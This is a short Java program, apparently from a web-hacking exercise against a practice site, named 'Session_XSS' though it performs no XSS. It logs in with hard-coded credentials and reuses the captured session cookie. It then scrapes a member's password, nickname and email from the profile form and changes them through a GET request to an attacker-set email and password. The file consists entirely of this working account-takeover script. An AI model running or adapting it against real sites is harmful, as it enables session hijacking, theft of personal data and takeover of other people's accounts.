import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class Session_XSS {

	public static void main(String[] args) throws Exception {
		
		String memberID = "tiamo";
		String memberPassword = "hacked";
		String target = "http://www.dowellcomputer.com/hacking/member/memberLoginAction.jsp?memberID=" + memberID + "&memberPassword=" + memberPassword;
		HttpURLConnection con = (HttpURLConnection) new URL(target).openConnection();
		String cookie = "";
		String temp = con.getHeaderField("Set-Cookie");
		if(temp != null)
		{
			cookie = temp;
		}
		System.out.println("현재 당신의 세션은: " + cookie + "입니다.");
		con = (HttpURLConnection) new URL("http://www.dowellcomputer.com/hacking/member/memberUpdateForm.jsp?ID=" + memberID).openConnection();
		con.setRequestProperty("Cookie", cookie);
		BufferedReader br = new BufferedReader(new InputStreamReader(con.getInputStream(), "UTF-8"));
		while((temp = br.readLine()) != null)
		{
			if(temp.contains("value=\"") && temp.contains("memberPassword"))
			{
				System.out.println("해당 사용자의 비밀번호: " + temp.split("value=\"")[1].split("\">")[0]);
			}
			if(temp.contains("value=\"") && temp.contains("memberNickname"))
			{
				System.out.println("해당 사용자의 닉네임: " + temp.split("value=\"")[1].split("\">")[0]);
			}
			if(temp.contains("value=\"") && temp.contains("memberEmail"))
			{
				System.out.println("해당 사용자의 이메일: " + temp.split("value=\"")[1].split("\">")[0]);
			}
//			System.out.println(temp);
		}
		con = (HttpURLConnection) new URL("http://www.dowellcomputer.com/hacking/member/memberUpdateAction.jsp?ID=" + memberID + "&memberPassword=hacked&memberNickname=test&memberEmail=hacked@naver.com").openConnection();
		con.setRequestProperty("Cookie", cookie);
		br = new BufferedReader(new InputStreamReader(con.getInputStream(), "UTF-8"));
		while((temp = br.readLine()) != null)
		{
			System.out.println(temp);
		}
		con.disconnect();
		br.close();
	}

}
